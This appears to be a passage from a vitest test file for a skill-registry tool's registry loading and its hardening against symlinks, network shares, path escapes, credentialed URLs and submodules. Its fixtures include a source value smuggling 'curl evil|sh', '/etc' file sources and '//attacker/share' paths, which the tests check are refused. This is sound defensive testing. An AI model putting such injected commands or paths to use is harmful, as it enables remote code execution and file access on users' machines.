import { execFileSync, spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { allowProtocolsForTests, setGitExecForTests, supervisedGit } from "./git.js";
import { fetchSource, parseSource } from "./source.js";
import { DEFAULT_REGISTRY, makeContext, registriesOf, validateManifest } from "./manifest.js";
import { addFromRegistry } from "./ops.js";
import {
  addRegistry,
  isRegistryName,
  loadRegistries,
  loadRegistry,
  publishToRegistry,
  removeRegistry,
  resolveRegistryName,
  searchRegistries,
} from "./registry.js";
import type { Context, LoadedRegistry, Manifest, RegistrySpec } from "./types.js";

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const realExec = { fn: supervisedGit };
const exec = vi.fn<typeof execFileSync>(supervisedGit);
const savedEnv = { ...process.env };

let base: string, home: string, proj: string, ctx: Context;

beforeEach(() => {
  base = fs.mkdtempSync(path.join(os.tmpdir(), "skwf-reg-"));
  home = path.join(base, "home");
  proj = path.join(base, "proj");
  for (const d of [home, proj]) fs.mkdirSync(d, { recursive: true });
  ctx = makeContext({ cwd: proj, home });
  setGitExecForTests(exec);
});
afterEach(() => {
  for (const k of Object.keys(process.env)) if (!(k in savedEnv)) delete process.env[k];
  Object.assign(process.env, savedEnv);
  exec.mockImplementation(realExec.fn);
  exec.mockClear();
  setGitExecForTests(undefined);
  allowProtocolsForTests(["file"]);
  vi.unstubAllGlobals();
  fs.rmSync(base, { recursive: true, force: true });
});

// ------------------------------------------------------------------ helpers
function git(...args: string[]): string {
  return execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@example.invalid", "-c", "commit.gpgsign=false", ...args], {
    stdio: ["ignore", "pipe", "pipe"],
  })
    .toString()
    .trim();
}

let repoCount = 0;
/** A bare repository at <base>/srv/<repoPath>.git whose single commit is built by `build`. */
function makeRepo(repoPath: string, build: (work: string) => void): void {
  const work = path.join(base, "work", String(repoCount++));
  git("init", "--quiet", work);
  build(work);
  git("-C", work, "add", "-A");
  git("-C", work, "commit", "--quiet", "-m", "one");
  const bare = path.join(base, "srv", `${repoPath}.git`);
  fs.mkdirSync(path.dirname(bare), { recursive: true });
  git("clone", "--quiet", "--bare", work, bare);
}

/** Route these URL prefixes to the bare repositories under <base>/srv through git's own insteadOf config. No network. */
function routeHosts(prefixes: string[]): void {
  const entries: [string, string][] = [
    ...prefixes.map((p): [string, string] => [`url.file://${path.join(base, "srv")}/.insteadOf`, p]),
    ["uploadpack.allowAnySHA1InWant", "true"],
  ];
  process.env.GIT_CONFIG_COUNT = String(entries.length);
  entries.forEach(([k, v], i) => {
    process.env[`GIT_CONFIG_KEY_${i}`] = k;
    process.env[`GIT_CONFIG_VALUE_${i}`] = v;
  });
}
const HOSTS = ["https://github.com/", "https://gitlab.com/", "https://git.acme.test/", "ssh://git@git.acme.test/"];

const entry = (name: string, source = `github:a/b/${name}`, description = `the ${name} skill`) => ({ name, description, source });
const index = (...skills: object[]) => JSON.stringify({ version: 1, skills });

function writeIndex(file: string, ...skills: object[]): string {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, index(...skills));
  return file;
}
let fixtureCount = 0;
/**
 * A project manifest may list a local registry only as a path below the project (Round E E2), while these
 * tests keep their fixtures beside it. So for the project's manifest an absolute fixture path is copied
 * into the project and listed by its relative path; `raw` writes the manifest exactly as given.
 */
function inProject(location: string): string {
  if (!path.isAbsolute(location) || location.startsWith(proj + path.sep)) return location;
  if (!fs.existsSync(location)) return `./fx-missing/${path.basename(location)}`;
  const into = path.join(proj, `fx-${fixtureCount++}`);
  fs.mkdirSync(into, { recursive: true });
  const copy = path.join(into, path.basename(location));
  fs.cpSync(location, copy, { recursive: true });
  return `./${path.relative(proj, copy).split(path.sep).join("/")}`;
}
function writeManifest(root: string, m: object, raw = false): void {
  fs.mkdirSync(root, { recursive: true });
  const body: Record<string, unknown> = { version: 1, agents: ["claude"], skills: {}, ...m };
  if (root === proj && !raw) {
    if (typeof body.registry === "string") body.registry = inProject(body.registry);
    if (Array.isArray(body.registries)) {
      body.registries = body.registries.map((r: { location?: unknown }) => (typeof r.location === "string" ? { ...r, location: inProject(r.location) } : r));
    }
  }
  fs.writeFileSync(path.join(root, "skillwharf.json"), JSON.stringify(body));
}
const names = (r: { index?: { skills: { name: string }[] } }) => (r.index?.skills ?? []).map((s) => s.name);

// ------------------------------------------------------------------ S2.1 the manifest
describe("S2.1: registries in the manifest", () => {
  const base1 = (extra: object): Manifest => ({ version: 1, agents: ["claude"], skills: {}, ...extra }) as Manifest;

  it("the old registry string loads as [{ name: registry, location }]", () => {
    expect(registriesOf(base1({ registry: "https://example.invalid/index.json" }))).toEqual([
      { name: "registry", location: "https://example.invalid/index.json" },
    ]);
  });

  it("nothing listed means the public registry", () => {
    expect(registriesOf(base1({}))).toEqual([{ name: "default", location: "default" }]);
  });

  it("an explicit empty list means no registries", () => {
    expect(registriesOf(base1({ registries: [] }))).toEqual([]);
  });

  it("a list keeps its order, and the old field is appended after it", () => {
    const m = base1({ registries: [{ name: "team", location: "./team.json" }], registry: "https://example.invalid/i.json" });
    expect(registriesOf(m).map((r) => r.name)).toEqual(["team", "registry"]);
  });

  it.each<[string, unknown, RegExp]>([
    ["not an array", "x", /registries.*array/],
    ["an entry that is not an object", ["x"], /registries\[0\]/],
    ["a name that is not a skill-style name", [{ name: "Bad Name", location: "./x" }], /registry name/],
    ["a duplicate name", [{ name: "a", location: "./x" }, { name: "a", location: "./y" }], /more than once/],
    ["an empty location", [{ name: "a", location: "" }], /location/],
    ["a location that is not a string", [{ name: "a", location: 5 }], /location/],
    ["a location with a control character", [{ name: "a", location: "./x\u001b[31m" }], /control/],
    ["a location over 1000 characters", [{ name: "a", location: "x".repeat(1001) }], /location/],
  ])("validateManifest refuses %s", (_what, registries, re) => {
    expect(() => validateManifest(base1({ registries }), "m.json")).toThrow(re);
  });

  it("validateManifest refuses the old field next to a list entry that is also named registry", () => {
    expect(() =>
      validateManifest(base1({ registry: "https://example.invalid/i.json", registries: [{ name: "registry", location: "./x" }] }), "m.json"),
    ).toThrow(/registry.*more than once|named "registry"/);
  });

  it("validateManifest refuses an old registry field that is not a string", () => {
    expect(() => validateManifest(base1({ registry: 5 }), "m.json")).toThrow(/registry.*string/);
  });

  it("validateManifest accepts a good list", () => {
    expect(() =>
      validateManifest(base1({ registries: [{ name: "team", location: "git+https://git.acme.test/team/registry.git" }] }), "m.json"),
    ).not.toThrow();
  });
});

// ------------------------------------------------------------------ S2.2 loading
describe("S2.2: loading a registry from https, a git repository or a path", () => {
  it("loads an index from a git repository's root", async () => {
    makeRepo("team/registry", (w) => writeIndex(path.join(w, "index.json"), entry("one", "git+https://git.acme.test/team/skills.git//one"), entry("two")));
    routeHosts(HOSTS);
    const idx = await loadRegistry("git+https://git.acme.test/team/registry.git");
    expect(idx.skills.map((s) => s.name)).toEqual(["one", "two"]);
    expect(idx.skills[0].source).toBe("git+https://git.acme.test/team/skills.git//one");
  });

  it("loads from a GitHub shorthand, a folder inside the repository and an ssh URL", async () => {
    makeRepo("acme/registry", (w) => writeIndex(path.join(w, "index.json"), entry("root")));
    makeRepo("team/registry", (w) => writeIndex(path.join(w, "reg", "index.json"), entry("nested")));
    routeHosts(HOSTS);
    expect(names({ index: await loadRegistry("github:acme/registry") })).toEqual(["root"]);
    expect(names({ index: await loadRegistry("git+https://git.acme.test/team/registry.git//reg") })).toEqual(["nested"]);
    expect(names({ index: await loadRegistry("git+ssh://git@git.acme.test/team/registry.git//reg") })).toEqual(["nested"]);
  });

  it("refuses an index.json that is a symlink, even to a file inside the repository", async () => {
    makeRepo("team/registry", (w) => {
      writeIndex(path.join(w, "real.json"), entry("one"));
      fs.symlinkSync("real.json", path.join(w, "index.json"));
    });
    routeHosts(HOSTS);
    await expect(loadRegistry("git+https://git.acme.test/team/registry.git")).rejects.toThrow(/not a regular file/);
  });

  it("refuses an index.json over 5 MB", async () => {
    makeRepo("team/registry", (w) => fs.writeFileSync(path.join(w, "index.json"), " ".repeat(5 * 1024 * 1024 + 1)));
    routeHosts(HOSTS);
    await expect(loadRegistry("git+https://git.acme.test/team/registry.git")).rejects.toThrow(/larger than 5 MB/);
  });

  it("says so when the repository has no index.json", async () => {
    makeRepo("team/registry", (w) => fs.writeFileSync(path.join(w, "README.md"), "hi"));
    routeHosts(HOSTS);
    await expect(loadRegistry("git+https://git.acme.test/team/registry.git")).rejects.toThrow(/Registry index not found/);
  });

  it("leaves no temp folder behind, success or failure", async () => {
    const tmp = path.join(base, "tmp");
    fs.mkdirSync(tmp);
    process.env.TMPDIR = tmp;
    makeRepo("team/registry", (w) => writeIndex(path.join(w, "index.json"), entry("one")));
    routeHosts(HOSTS);
    await loadRegistry("git+https://git.acme.test/team/registry.git");
    await expect(loadRegistry("git+https://git.acme.test/team/missing.git")).rejects.toThrow();
    expect(fs.readdirSync(tmp)).toEqual([]);
  });

  it("a git registry is fetched with the same guards as a skill", async () => {
    makeRepo("team/registry", (w) => writeIndex(path.join(w, "index.json"), entry("one")));
    routeHosts(HOSTS);
    await loadRegistry("git+https://git.acme.test/team/registry.git", { timeoutMs: 7000 });
    const calls = exec.mock.calls.filter((c) => c[0] === "git");
    const args = (calls[0][1] as string[]).filter((_, i) => i >= 12); // after the six `-c key=value` hardening settings
    expect(args).toEqual(["clone", "--depth", "1", "--quiet", "--no-checkout", "--", "https://git.acme.test/team/registry.git", expect.any(String)]);
    for (const c of calls) {
      const o = c[2] as Record<string, unknown>;
      expect((o.env as Record<string, string>).GIT_ALLOW_PROTOCOL).toMatch(/^https:ssh/);
      expect((o.env as Record<string, string>).GIT_TERMINAL_PROMPT).toBe("0");
      expect((o.stdio as string[])[0]).toBe("ignore");
      expect(o.timeout).toBe(7000);
    }
  });

  it("the location default is the public registry", async () => {
    const fetchSpy = vi.fn(async () => new Response(index(entry("pdf"))));
    vi.stubGlobal("fetch", fetchSpy);
    const idx = await loadRegistry("default");
    expect(idx.skills.map((s) => s.name)).toEqual(["pdf"]);
    expect(fetchSpy.mock.calls[0]).toEqual([DEFAULT_REGISTRY, expect.objectContaining({ redirect: "error" })]);
  });

  it("refuses an https registry URL with credentials without making a request", async () => {
    const fetchSpy = vi.fn(async () => new Response("{}"));
    vi.stubGlobal("fetch", fetchSpy);
    await expect(loadRegistry("https://user:pw@example.invalid/index.json")).rejects.toThrow(/credential/);
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it("still refuses plain http", async () => {
    await expect(loadRegistry("http://example.invalid/index.json")).rejects.toThrow(/https/);
  });

  it("every index goes through the same schema check: any git host kept; path, file and git sources dropped", async () => {
    const file = writeIndex(
      path.join(base, "i.json"),
      entry("gh", "github:a/b/x"),
      entry("gl", "gitlab:a/b/c//x"),
      entry("bb", "bitbucket:a/b/x"),
      entry("own", "git+https://git.acme.test/team/skills.git//x"),
      entry("ssh", "git+ssh://git@git.acme.test/team/skills.git//x"),
      entry("local", "path:/etc"),
      entry("file", "file:///etc"),
      entry("plain", "git://git.acme.test/x.git"),
      entry("creds", "git+https://u:p@git.acme.test/x.git"),
      entry("shell", "github:o/r/x;curl evil|sh"),
    );
    expect((await loadRegistry(file)).skills.map((s) => s.name)).toEqual(["gh", "gl", "bb", "own", "ssh"]);
  });

  it("descriptions are cut to 300 characters and cleaned, and unknown fields are not passed on", async () => {
    const file = writeIndex(path.join(base, "i.json"), { ...entry("x", "github:a/b/x", "d".repeat(400) + "\u001b[31m"), extra: "no" });
    const [e] = (await loadRegistry(file)).skills;
    expect(e.description).toHaveLength(300);
    expect(e).not.toHaveProperty("extra");
  });
});

// ------------------------------------------------------------------ S2.2 several registries
describe("S2.2: a registry that fails to load is reported by name, the others still answer", () => {
  it("returns one result per registry, in order", async () => {
    const good = writeIndex(path.join(base, "good.json"), entry("one"));
    const specs: RegistrySpec[] = [
      { name: "broken", location: path.join(base, "missing.json") },
      { name: "good", location: good },
      { name: "gone", location: "git+https://git.acme.test/gone/registry.git" },
    ];
    routeHosts(HOSTS);
    const r = await loadRegistries(ctx, { only: specs });
    expect(r.map((x) => x.name)).toEqual(["broken", "good", "gone"]);
    expect(r[0].error).toMatch(/Registry index not found/);
    expect(names(r[1])).toEqual(["one"]);
    expect(r[1].error).toBeUndefined();
    expect(r[2].error).toMatch(/git\.acme\.test\/gone\/registry\.git/);
    expect(r.map((x) => x.scope)).toEqual(["cli", "cli", "cli"]);
  });
});

describe("S2.1: the global list comes first, the project list after", () => {
  const globalRoot = () => path.join(home, ".skillwharf");
  let a: string, b: string, c: string;
  beforeEach(() => {
    a = writeIndex(path.join(base, "a.json"), entry("from-a"));
    b = writeIndex(path.join(base, "b.json"), entry("from-b"));
    c = writeIndex(path.join(base, "c.json"), entry("from-c"));
  });

  it("appends the project's registries after the global ones", async () => {
    writeManifest(globalRoot(), { registries: [{ name: "company", location: a }] });
    writeManifest(proj, { registries: [{ name: "team", location: b }] });
    const r = await loadRegistries(ctx);
    expect(r.map((x) => [x.name, x.scope])).toEqual([["company", "global"], ["team", "project"]]);
    expect(r.flatMap(names)).toEqual(["from-a", "from-b"]);
  });

  it("a project that lists nothing uses the global list alone, and neither listing means the public registry", async () => {
    writeManifest(globalRoot(), { registries: [{ name: "company", location: a }] });
    writeManifest(proj, {});
    expect((await loadRegistries(ctx)).map((x) => x.name)).toEqual(["company"]);

    fs.rmSync(globalRoot(), { recursive: true });
    vi.stubGlobal("fetch", async () => new Response(index(entry("pdf"))));
    const r = await loadRegistries(ctx);
    expect(r.map((x) => [x.name, x.location])).toEqual([["default", "default"]]);
    expect(names(r[0])).toEqual(["pdf"]);
  });

  it("the same name at the same location is one registry, at the global position", async () => {
    // the same text in both manifests is the same registry (a project may not write an absolute path)
    writeManifest(globalRoot(), { registries: [{ name: "company", location: "./a.json" }, { name: "x", location: c }] });
    writeManifest(proj, { registries: [{ name: "company", location: "./a.json" }, { name: "team", location: b }] });
    expect((await loadRegistries(ctx)).map((x) => [x.name, x.scope])).toEqual([["company", "global"], ["x", "global"], ["team", "project"]]);
  });

  it("the same name at another location: the global registry keeps the name, the project's becomes project:<name>", async () => {
    // A cloned repository's manifest must not be able to take over a name the user chose for their own registry.
    writeManifest(globalRoot(), { registries: [{ name: "company", location: a }] });
    writeManifest(proj, { registries: [{ name: "company", location: b }] });
    const r = await loadRegistries(ctx);
    expect(r.map((x) => [x.name, x.scope])).toEqual([["company", "global"], ["project:company", "project"]]);
    expect(r.flatMap(names)).toEqual(["from-a", "from-b"]);
    expect(r[0].note).toBeUndefined();
    expect(r[1].note).toMatch(/registry "company" in this project is at another location than your global registry of that name; it is shown as project:company/);
  });

  it("add <name> from the renamed registry works with --from project:<name>", async () => {
    writeManifest(globalRoot(), { registries: [{ name: "company", location: a }] });
    writeManifest(proj, { registries: [{ name: "company", location: b }] });
    const r = await loadRegistries(ctx);
    expect(resolveRegistryName(r, "from-b", "project:company").registry).toBe("project:company");
    expect(() => resolveRegistryName(r, "from-b", "company")).toThrow(/"from-b" is not in registry "company"/);
  });

  it("the command line says it once per run, on stderr", () => {
    writeManifest(globalRoot(), { registries: [{ name: "company", location: a }] });
    writeManifest(proj, { registries: [{ name: "company", location: b }] });
    const r = spawnSync(process.execPath, [path.join(repoRoot, "node_modules/tsx/dist/cli.mjs"), path.join(repoRoot, "src/cli.ts"), "--json", "search", "from"], {
      cwd: proj,
      env: { ...process.env, SKILLWHARF_HOME: home },
      encoding: "utf8",
    });
    expect(r.status).toBe(0);
    expect(r.stderr.match(/is shown as project:company/g)).toHaveLength(1);
    expect((JSON.parse(r.stdout) as { registry: string }[]).map((x) => x.registry)).toEqual(["company", "project:company"]);
  });

  it("a relative path location is read from the folder of the manifest that lists it", async () => {
    writeIndex(path.join(proj, "reg", "index.json"), entry("local-one"));
    writeManifest(proj, { registries: [{ name: "local", location: "./reg" }] });
    const r = await loadRegistries(ctx);
    expect(names(r[0])).toEqual(["local-one"]);
  });

  it("with --global only the global manifest is read", async () => {
    writeManifest(globalRoot(), { registries: [{ name: "company", location: a }] });
    writeManifest(proj, { registries: [{ name: "team", location: b }] });
    const r = await loadRegistries(makeContext({ global: true, home }));
    expect(r.map((x) => x.name)).toEqual(["company"]);
  });

  it("the old registry field keeps working and is named registry", async () => {
    writeManifest(proj, { registry: a });
    const r = await loadRegistries(ctx);
    expect(r.map((x) => x.name)).toEqual(["registry"]);
    expect(names(r[0])).toEqual(["from-a"]);
  });
});

// ------------------------------------------------------------------ Round C
describe("Round C C3: an interrupt during a registry load stops everything", () => {
  const interrupted = () =>
    exec.mockImplementation((() => {
      throw Object.assign(new Error("Command failed"), { status: 130, stderr: Buffer.from("") });
    }) as never);

  it("loadRegistries rethrows it instead of reporting it as one registry's error, and starts no other registry", async () => {
    allowProtocolsForTests([]);
    interrupted();
    exec.mockClear();
    const specs: RegistrySpec[] = [
      { name: "a", location: "git+https://git.acme.test/a/registry.git" },
      { name: "b", location: "git+https://git.acme.test/b/registry.git" },
    ];
    await expect(loadRegistries(ctx, { only: specs })).rejects.toMatchObject({ kind: "interrupted" });
    expect(exec.mock.calls.filter((c) => c[0] === "git").length).toBe(1);
  });

  it("add <name> installs nothing after an interrupt", async () => {
    allowProtocolsForTests([]);
    interrupted();
    writeManifest(proj, { registries: [{ name: "r", location: "git+https://git.acme.test/team/registry.git" }] });
    await expect(addFromRegistry(ctx, "alpha", { cwd: base })).rejects.toMatchObject({ kind: "interrupted" });
    expect(fs.existsSync(path.join(proj, ".skillwharf"))).toBe(false);
    expect(JSON.parse(fs.readFileSync(path.join(proj, "skillwharf.json"), "utf8")).skills).toEqual({});
  });
});

describe("Round C C1c: a registry location that names a share is refused before the file system is asked", () => {
  afterEach(() => vi.restoreAllMocks());
  const watch = () => {
    const seen: string[] = [];
    const stat = fs.statSync;
    const exists = fs.existsSync;
    vi.spyOn(fs, "statSync").mockImplementation(((p: string, o?: never) => (seen.push(String(p)), stat(p, o))) as never);
    vi.spyOn(fs, "existsSync").mockImplementation(((p: string) => (seen.push(String(p)), exists(p))) as never);
    return seen;
  };

  it.each(["//attacker/share", "\\\\attacker\\share\\index.json", "C:/registry", "c:\\registry\\index.json"])("loadRegistry refuses %s", async (location) => {
    const seen = watch();
    await expect(loadRegistry(location)).rejects.toThrow(/names a network share or a drive/);
    expect(seen.filter((p) => /attacker|^[A-Za-z]:|^\/\//.test(p))).toEqual([]);
  });

  it("a relative location in a project manifest that is a link to a share is refused, and never opened", async () => {
    fs.symlinkSync("//attacker/share/x", path.join(proj, "evil"));
    writeManifest(proj, { registries: [{ name: "evil", location: "./evil" }, { name: "ok", location: writeIndex(path.join(base, "ok.json"), entry("one")) }] });
    const seen = watch();
    const r = await loadRegistries(ctx);
    expect(r[0].error).toMatch(/leaves the folder of the manifest that lists it/);
    expect(names(r[1])).toEqual(["one"]);
    expect(seen.filter((p) => p.endsWith(`${path.sep}evil`))).toEqual([]);
  });

  it("a location in a project manifest that is a plain relative folder still loads", async () => {
    writeIndex(path.join(proj, "reg", "index.json"), entry("local-one"));
    writeManifest(proj, { registries: [{ name: "local", location: "./reg" }] });
    expect(names((await loadRegistries(ctx))[0])).toEqual(["local-one"]);
  });
});

// ------------------------------------------------------------------ Round D
describe("Round D D5/D4/D2: where a registry location may point", () => {
  afterEach(() => vi.restoreAllMocks());
  const watch = () => {
    const seen: string[] = [];
    const stat = fs.statSync;
    const exists = fs.existsSync;
    const lstat = fs.lstatSync;
    vi.spyOn(fs, "statSync").mockImplementation(((p: string, o?: never) => (seen.push(String(p)), stat(p, o))) as never);
    vi.spyOn(fs, "existsSync").mockImplementation(((p: string) => (seen.push(String(p)), exists(p))) as never);
    vi.spyOn(fs, "lstatSync").mockImplementation(((p: string, o?: never) => (seen.push(String(p)), lstat(p, o))) as never);
    return seen;
  };

  it("D5: a relative location in a project manifest that leaves the manifest's folder is refused before any stat, even when it is not a link", async () => {
    const outside = path.join(base, "outside-reg");
    writeIndex(path.join(outside, "index.json"), entry("outside-one"));
    writeManifest(proj, { registries: [{ name: "up", location: "../outside-reg" }, { name: "deep", location: "../../../../net/attacker/x" }] });
    const seen = watch();
    const r = await loadRegistries(ctx);
    vi.restoreAllMocks();
    expect(r[0].error).toMatch(/leaves the folder of the manifest that lists it/);
    expect(r[0].index).toBeUndefined();
    expect(r[1].error).toMatch(/leaves the folder of the manifest that lists it/);
    expect(seen.filter((p) => p.includes("outside-reg") || p.includes(`${path.sep}net${path.sep}`))).toEqual([]);
  });

  it("D5: a relative location that stays inside still loads, and so does an absolute one the user typed with --registry", async () => {
    writeIndex(path.join(proj, "reg", "index.json"), entry("in-one"));
    writeManifest(proj, { registries: [{ name: "in", location: "./reg/../reg" }] });
    expect(names((await loadRegistries(ctx))[0])).toEqual(["in-one"]);
    const abs = writeIndex(path.join(base, "abs", "index.json"), entry("abs-one"));
    expect(names((await loadRegistries(ctx, { only: [{ name: "abs", location: abs }] }))[0])).toEqual(["abs-one"]);
  });

  it("D4: a 33-hop chain ending in share text is refused as leaving the folder, and nothing is asked about the share", async () => {
    for (let i = 1; i < 33; i++) fs.symlinkSync(`l${i + 1}`, path.join(proj, `l${i}`));
    fs.symlinkSync("//attacker/share/x", path.join(proj, "l33"));
    writeManifest(proj, { registries: [{ name: "chain", location: "./l1" }] });
    const followed: string[] = [];
    const stat = fs.statSync;
    const exists = fs.existsSync;
    vi.spyOn(fs, "statSync").mockImplementation(((p: string, o?: never) => (followed.push(String(p)), stat(p, o))) as never);
    vi.spyOn(fs, "existsSync").mockImplementation(((p: string) => (followed.push(String(p)), exists(p))) as never);
    const r = await loadRegistries(ctx);
    vi.restoreAllMocks();
    expect(r[0].error).toMatch(/leaves the folder of the manifest that lists it/);
    // the chain is walked by hand (lstat); stat and exists would follow it to the share
    expect(followed.filter((p) => p.endsWith(`${path.sep}l1`))).toEqual([]);
  });

  it("D2: a drive-letter location is refused for a project manifest, not for the global one or for --registry", async () => {
    const asked = async (spec: RegistrySpec, scope: "project" | "global" | "cli") => {
      for (const root of [proj, path.join(home, ".skillwharf")]) fs.rmSync(path.join(root, "skillwharf.json"), { force: true });
      if (scope === "project") writeManifest(proj, { registries: [spec] }, true);
      if (scope === "global") writeManifest(path.join(home, ".skillwharf"), { registries: [spec] });
      const r = scope === "cli" ? await loadRegistries(ctx, { only: [spec] }) : await loadRegistries(scope === "global" ? makeContext({ global: true, home }) : ctx);
      return r[0].error ?? "";
    };
    const spec = { name: "win", location: "C:\\registry\\index.json" };
    expect(await asked(spec, "project")).toMatch(/names a network share or a drive/);
    expect(await asked(spec, "global")).not.toMatch(/names a network share or a drive/);
    expect(await asked(spec, "cli")).not.toMatch(/names a network share or a drive/);
    // a share is refused in all three
    const share = { name: "net", location: "//attacker/share/index.json" };
    for (const scope of ["project", "global", "cli"] as const) expect(await asked(share, scope)).toMatch(/names a network share or a drive/);
  });
});

// ------------------------------------------------------------------ Round E
describe("Round E E2: a project manifest lists a local registry only as a path below it", () => {
  afterEach(() => vi.restoreAllMocks());

  it("an absolute location (or ~/x) is refused before any stat, even when it names a real registry", async () => {
    const real = path.join(base, "somewhere", "reg");
    writeIndex(path.join(real, "index.json"), entry("real-one"));
    writeManifest(
      proj,
      {
        registries: [
          { name: "net", location: "/net/host/x" },
          { name: "real", location: real },
          { name: "home", location: "~/regs" },
        ],
      },
      true,
    );
    const seen: string[] = [];
    const stat = fs.statSync;
    const exists = fs.existsSync;
    vi.spyOn(fs, "statSync").mockImplementation(((p: string, o?: never) => (seen.push(String(p)), stat(p, o))) as never);
    vi.spyOn(fs, "existsSync").mockImplementation(((p: string) => (seen.push(String(p)), exists(p))) as never);
    const r = await loadRegistries(ctx);
    vi.restoreAllMocks();
    for (const one of r) {
      expect(one.error).toMatch(/absolute path in a project's manifest/);
      expect(one.index).toBeUndefined();
    }
    expect(seen.filter((p) => p.startsWith("/net") || p.startsWith(real) || p.includes(`${path.sep}regs`))).toEqual([]);
  });

  it("the global manifest and --registry may use an absolute path", async () => {
    const real = path.join(base, "somewhere", "reg");
    writeIndex(path.join(real, "index.json"), entry("real-one"));
    writeManifest(path.join(home, ".skillwharf"), { registries: [{ name: "mine", location: real }] });
    expect(names((await loadRegistries(makeContext({ global: true, home })))[0])).toEqual(["real-one"]);
    expect(names((await loadRegistries(ctx, { only: [{ name: "cli", location: real }] }))[0])).toEqual(["real-one"]);
  });

  it("registry add refuses, before writing, a folder the manifest could not list; -g accepts it", async () => {
    const real = path.join(base, "somewhere", "reg");
    writeIndex(path.join(real, "index.json"), entry("real-one"));
    writeManifest(proj, { registries: [] });
    const before = fs.readFileSync(path.join(proj, "skillwharf.json"), "utf8");
    await expect(addRegistry(ctx, "outside", real)).rejects.toThrow(/only as a path below the project/);
    expect(fs.readFileSync(path.join(proj, "skillwharf.json"), "utf8")).toBe(before);
    writeManifest(path.join(home, ".skillwharf"), { registries: [] });
    await expect(addRegistry(makeContext({ global: true, home }), "outside", real)).resolves.toEqual({ entries: 1 });
  });
});

// ------------------------------------------------------------------ Round B
describe("Round B A1: registry entries pinned to a hex ref are reported, not silently dropped", () => {
  it("names them in a note, keeps the rest, and says what to write", async () => {
    const file = writeIndex(
      path.join(base, "i.json"),
      entry("good", "github:a/b/good"),
      entry("tagged", "github:a/b/tagged@deadbeef"),
      entry("other", "github:a/b/other@abcdef0123"),
      entry("local", "path:/etc"),
    );
    const idx = await loadRegistry(file);
    expect(idx.skills.map((s) => s.name)).toEqual(["good"]);
    expect(idx.skippedHexRefs).toEqual(["tagged", "other"]);
    const [r] = await loadRegistries(ctx, { only: [{ name: "reg", location: file }] });
    expect(r.note).toMatch(/2 entries skipped: tagged, other.*hex ref.*@refs\/tags\/<name> or @refs\/heads\/<name>/);
  });

  it("an entry that writes the full ref is kept", async () => {
    const file = writeIndex(path.join(base, "i.json"), entry("tagged", "github:a/b/tagged@refs/tags/deadbeef"));
    const idx = await loadRegistry(file);
    expect(idx.skills.map((s) => s.name)).toEqual(["tagged"]);
    expect(idx.skippedHexRefs).toBeUndefined();
  });

  it("a registry full of such entries cannot flood the note", async () => {
    const entries = Array.from({ length: 40 }, (_, i) => entry(`t${i}`, `github:a/b/x@deadbeef${i}`));
    const file = writeIndex(path.join(base, "i.json"), ...entries);
    const [r] = await loadRegistries(ctx, { only: [{ name: "reg", location: file }] });
    expect(r.note).toMatch(/40 entries skipped: t0, t1, t2, t3, t4 and 35 more/);
  });
});

describe("Round B A2: the name default belongs to the public registry", () => {
  it("validateManifest refuses a registry called default that points somewhere else", () => {
    const m = { version: 1, agents: ["claude"], skills: {}, registries: [{ name: "default", location: "https://evil.example/index.json" }] } as Manifest;
    expect(() => validateManifest(m, "m.json")).toThrow(/the name "default" is the public registry; it cannot point at/);
  });

  it("validateManifest accepts default pointing at default, and any other name anywhere", () => {
    const ok = { version: 1, agents: ["claude"], skills: {}, registries: [{ name: "default", location: "default" }, { name: "mine", location: "./x" }] } as Manifest;
    expect(() => validateManifest(ok, "m.json")).not.toThrow();
  });

  it("registry add refuses default for a location of your own, before loading anything", async () => {
    writeManifest(proj, {});
    const spy = vi.fn(async () => new Response("{}"));
    vi.stubGlobal("fetch", spy);
    await expect(addRegistry(ctx, "default", "https://evil.example/index.json")).rejects.toThrow(/the name "default" is the public registry/);
    expect(spy).not.toHaveBeenCalled();
  });
});

describe("Round B B6: publish never writes through a symlink", () => {
  it("refuses an index.json that is a symlink and leaves its target alone", () => {
    const reg = path.join(base, "checkout");
    const outside = path.join(base, "outside.json");
    fs.mkdirSync(reg);
    fs.writeFileSync(outside, '{"version":1,"skills":[]}\n');
    fs.symlinkSync(outside, path.join(reg, "index.json"));
    expect(() => publishToRegistry(reg, { name: "x", description: "d", source: "github:a/b/x" })).toThrow(/symlink/);
    expect(fs.readFileSync(outside, "utf8")).toBe('{"version":1,"skills":[]}\n');
  });

  it("refuses a checkout whose folder inside is a symlink out of it", () => {
    const reg = path.join(base, "checkout");
    fs.mkdirSync(reg);
    fs.mkdirSync(path.join(base, "elsewhere"));
    // index.json would be reached through a linked folder only for a nested location; the file itself is the one case here
    fs.symlinkSync(path.join(base, "elsewhere", "index.json"), path.join(reg, "index.json"));
    expect(() => publishToRegistry(reg, { name: "x", description: "d", source: "github:a/b/x" })).toThrow(/symlink/);
    expect(fs.existsSync(path.join(base, "elsewhere", "index.json"))).toBe(false);
  });

  it("still publishes into an ordinary checkout, and into one reached through a symlinked folder", () => {
    const reg = path.join(base, "checkout");
    fs.mkdirSync(reg);
    const alias = path.join(base, "alias");
    fs.symlinkSync(reg, alias);
    expect(publishToRegistry(alias, { name: "x", description: "d", source: "github:a/b/x" }).created).toBe(true);
    expect(fs.readFileSync(path.join(reg, "index.json"), "utf8")).toContain('"name": "x"');
  });
});

// ------------------------------------------------------------------ Round A D5
describe("Round A D5: a registry in a git repository never opens submodules, and one search has one time limit", () => {
  const FAKE = "1234567890abcdef1234567890abcdef12345678";

  it("loads the index and contacts none of the repository's submodules", async () => {
    makeRepo("team/registry", (w) => {
      writeIndex(path.join(w, "index.json"), entry("one"));
      fs.mkdirSync(path.join(w, "vendor", "x"), { recursive: true });
      git("-C", w, "update-index", "--add", "--cacheinfo", `160000,${FAKE},vendor/x`);
      fs.writeFileSync(path.join(w, ".gitmodules"), '[submodule "vendor/x"]\n\tpath = vendor/x\n\turl = https://git.acme.test/other/x.git\n');
    });
    routeHosts(HOSTS);
    exec.mockClear();
    const idx = await loadRegistry("git+https://git.acme.test/team/registry.git");
    expect(idx.skills.map((s) => s.name)).toEqual(["one"]);
    const argvs = exec.mock.calls.filter((c) => c[0] === "git").map((c) => (c[1] as string[]).join(" "));
